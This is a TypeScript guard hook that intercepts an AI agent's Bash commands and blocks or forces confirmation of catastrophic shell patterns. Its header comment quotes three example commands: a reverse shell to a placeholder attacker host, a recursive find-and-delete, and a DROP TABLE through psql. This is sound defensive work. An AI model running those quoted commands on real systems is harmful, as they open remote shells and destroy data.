#!/usr/bin/env bun
/**
 * CatastrophicGuard.hook.ts — PreToolUse (Bash)
 *
 * Gates the catastrophic shell shapes that `permissions.deny` structurally
 * cannot see.
 *
 * WHY A HOOK AND NOT A PERMISSION RULE
 *
 * Bash permission rules are prefix/wildcard matchers — `Bash(git commit *)`
 * gates a command by its head. The shapes this hook catches live mid-command,
 * behind a legitimate head:
 *
 *     bash -c 'sh -i >& /dev/tcp/attacker/4444 0>&1'
 *     find / -name '*.log' -exec rm -rf {} \;
 *     psql "$DATABASE_URL" -c 'DROP TABLE users;'
 *
 * `bash`, `find`, and `psql` are all things Aaron runs daily. Only the tail is
 * dangerous. That is precisely the class `~/.claude/doctrine/self-healing.md` reserves hooks
 * for: a gate on an irreversible act, checkable mechanically.
 *
 * Shapes that DO fit a prefix rule are not here — they live in
 * `settings.json` → `permissions.deny`, where they are enforced by the harness
 * without depending on this hook running at all. Two layers, on purpose.
 *
 * FAIL-OPEN, STATED PLAINLY
 *
 * On unreadable stdin or a malformed payload this hook exits 0 and the command
 * proceeds. That is the same call `hook-io.ts` documents: a hook that takes
 * down the session over a harness-version problem is worse than one that skips
 * an invocation. The compensating control is that the deny list in
 * settings.json does not route through here.
 *
 * It follows that this hook is a SECOND layer and never the only one. Anything
 * expressible as a prefix rule belongs in settings.json, not added here.
 *
 * TRIGGER: PreToolUse (matcher: Bash)
 */

import { block, readHookInput } from "./lib/hook-io.ts";
import { matchCatastrophicShape } from "./lib/catastrophic-shapes.ts";

/** Escape hatch, matching the convention of the other gates in this tree. */
const DISABLED = process.env.CATGUARD_OFF === "1";

/**
 * Floor the permission decision at a prompt. The harness honors this over auto
 * mode for unsandboxed Bash, so an `ask` here cannot be silently auto-approved.
 */
function ask(reason: string): never {
  process.stdout.write(
    JSON.stringify({
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "ask",
        permissionDecisionReason: reason,
      },
    }),
  );
  process.exit(0);
}

async function main(): Promise<void> {
  if (DISABLED) return;

  const input = await readHookInput();
  if (!input) return; // fail open — see header

  if (input.tool_name !== "Bash") return;

  const command = input.tool_input?.command;
  if (typeof command !== "string" || command.trim() === "") return;

  const match = matchCatastrophicShape(command);
  if (!match) return;

  if (match.tier === "block") {
    block(
      `BLOCKED by CatastrophicGuard: ${match.reason}.\n` +
        `Matched shape: /${match.pattern}/\n` +
        `This shape has no legitimate use in this harness. If it genuinely does ` +
        `here, that is a doctrine change — say so and we will make it one, rather ` +
        `than working around the gate.`,
    );
  }

  ask(
    `${match.reason}. Matched /${match.pattern}/ — confirm this is intended ` +
      `and that the target is not production.`,
  );
}

main().catch(() => process.exit(0));
